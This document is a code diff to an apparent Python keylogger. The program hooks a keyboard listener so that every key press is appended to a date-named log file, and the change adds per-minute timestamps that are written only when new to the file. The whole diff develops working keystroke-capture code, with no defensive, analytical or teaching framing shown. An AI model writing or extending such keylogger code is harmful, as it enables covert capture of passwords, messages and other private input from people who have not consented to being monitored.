@@ -6,8 +6,10 @@ from datetime import datetime
 def write_to_file(key):
     letter = str(key)
     datelogname = datetime.today().strftime('%m-%d-%Y')       # to be used for naming the log with the date in it.
-    datetimestamp = datetime.today().strftime('%m-%d-%Y %I:%M:%S %p')
+    datetimestamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')
 
+
+    # print(datetimestamp)
 
     # replaces the double quotes with  a space. Plus, it allows us to add  a space between the letters.
     # letter = letter.replace("'", " ")
@@ -130,9 +132,12 @@ def write_to_file(key):
     if letter == 'Key.insert':
         letter = ''
 
+    if datetimestamp in open(datelogname + "log.txt").read():
+        # print("Datetimestamp is in the file")
+        datetimestamp = ''
 
     with open(datelogname + "log.txt", 'a') as f:
-      f.write(letter)  # writes to the file with the quoted text to the file
+        f.write(datetimestamp + " " + letter)  # writes to the file with the quoted text to the file
 
 
 with Listener(on_press=write_to_file) as l:  # listener is basically L in this case. This will run when you press a key.
